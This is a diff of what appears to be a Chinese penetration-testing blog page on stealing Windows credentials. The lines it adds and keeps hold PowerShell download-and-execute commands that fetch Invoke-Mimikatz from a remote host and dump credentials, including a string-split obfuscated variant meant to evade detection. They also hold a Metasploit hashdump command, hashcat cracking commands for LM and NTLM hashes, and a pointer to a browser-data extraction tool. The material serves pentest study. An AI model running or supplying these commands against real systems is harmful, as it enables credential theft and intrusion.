@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172347238.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172859541.png">
 <meta property="article:published_time" content="2024-01-10T08:20:20.000Z">
-<meta property="article:modified_time" content="2024-03-06T14:36:40.452Z">
+<meta property="article:modified_time" content="2024-11-27T05:20:42.871Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.4k words
+          8.4k words
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          62 mins
+          71 mins
         
       </span>
     
@@ -554,7 +554,10 @@
 </li>
 <li><p>powersehll远程执行mimikatz脚本</p>
 <p>需要托托管到远程</p>
-<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-ObjectNet.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.81.154:8000<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz –DumpCreds<br>powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">mattifestation</span><span class="hljs-operator">/</span>PowerSploit<span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span>Exfiltration<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz-DumpCreds<br>   <br></code></pre></td></tr></table></figure></li>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-ObjectNet.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.81.154:8000<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz –DumpCreds<br>powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">mattifestation</span><span class="hljs-operator">/</span>PowerSploit<span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span>Exfiltration<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz-DumpCreds<br>   <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>powershell 混淆执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs posershell">powershell -c &quot;(&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.81&#x27;+&#x27;.154:8000/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;<br></code></pre></td></tr></table></figure></li>
 </ol>
 <h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h3><blockquote>
 <p>  ProcDump是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为dump文件，又因为  是微软自家出品，所以可以过很多杀软。  </p>
@@ -615,6 +618,11 @@
 <li><p>获取sam数据库</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240112140327159.png" srcset="/img/loading.gif" lazyload alt="image-20240112140327159"></p>
 </li>
+<li><p>更加高级的hashdump 模块，用于提高获取hash 的可能性</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/g</span>ather/smart_hashdump<br></code></pre></td></tr></table></figure>
+
+<p>但是前提依然是需要高权限才能获取成功</p>
+</li>
 </ol>
 <h3 id="CS-获取hash"><a href="#CS-获取hash" class="headerlink" title="CS 获取hash"></a>CS 获取hash</h3><p>主要还是使用   Mimikatz  </p>
 <ol>
@@ -638,7 +646,24 @@
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115163317507.png" srcset="/img/loading.gif" lazyload alt="image-20240115163317507"></p>
 </li>
 </ol>
-<h3 id="hash解密"><a href="#hash解密" class="headerlink" title="hash解密"></a>hash解密</h3><p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
+<h3 id="hash解密"><a href="#hash解密" class="headerlink" title="hash解密"></a>hash解密</h3><h4 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h4><p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
+<h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><ol>
+<li><p>LM hash</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">3000</span> <span class="hljs-attr">--force</span> <span class="hljs-string">&#x27;E52CAC67419A9A224A3B108F3FA6CB6D&#x27;</span> password.txt<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-a 0: 指定攻击模式为直接攻击(Straight attack)。<br>-m 3000: 指定哈希类型为LM Hash。<br>-force: 强制执行，忽略某些警告或错误。<br>‘E52CAC67419A9A224A3B108F3FA6CB6D’:要破解的LM Hash。<br>password.txt:包含候选密码的字典文件。</p>
+</blockquote>
+</li>
+<li><p>ntml hash</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">1000</span> --force &#x27;1F<span class="hljs-number">2916</span>B<span class="hljs-number">756188560128</span>7D5F<span class="hljs-number">693567</span>A34&#x27; password.txt<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>-a 0：指定攻击模式为直接攻击。<br>-m 1000: 指定哈希类型为NTLM Hash。<br>-force: 强制执行，忽略某些警告或错误。<br>‘1F2916B7561885601287D5F693567A34’: 要破解的NTLM Hash。<br>password.txt: 包含候选密码的字典文件。</p>
+</blockquote>
+</li>
+</ol>
 <h1 id="其他密码凭证获取"><a href="#其他密码凭证获取" class="headerlink" title="其他密码凭证获取"></a>其他密码凭证获取</h1><h2 id="RDP连接密码解密"><a href="#RDP连接密码解密" class="headerlink" title="RDP连接密码解密"></a>RDP连接密码解密</h2><ol>
 <li><p>查看本地机器本地连接过的目标主机</p>
 <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span> /s<br></code></pre></td></tr></table></figure>
@@ -704,7 +729,7 @@
 </ol>
 <p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240115172859541.png" srcset="/img/loading.gif" lazyload alt="image-20240115172859541"></p>
 <p>   感觉这个会快很多</p>
-<h3 id="应用程序密码解密"><a href="#应用程序密码解密" class="headerlink" title="应用程序密码解密"></a>应用程序密码解密</h3><p>  对密码已保存在 Windwos 系统上的部分程序进行解析，包括：  Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。  </p>
+<h2 id="应用程序密码解密"><a href="#应用程序密码解密" class="headerlink" title="应用程序密码解密"></a>应用程序密码解密</h2><p>  对密码已保存在 Windwos 系统上的部分程序进行解析，包括：  Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。  </p>
 <p>  ackBrowserData 是一个浏览器数据（密码|历史记录|Cookie|书签|信用卡|下载记录|localStorage|浏览器插件）的导出工具，支持全平台主流浏览器。  </p>
 <p><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
 
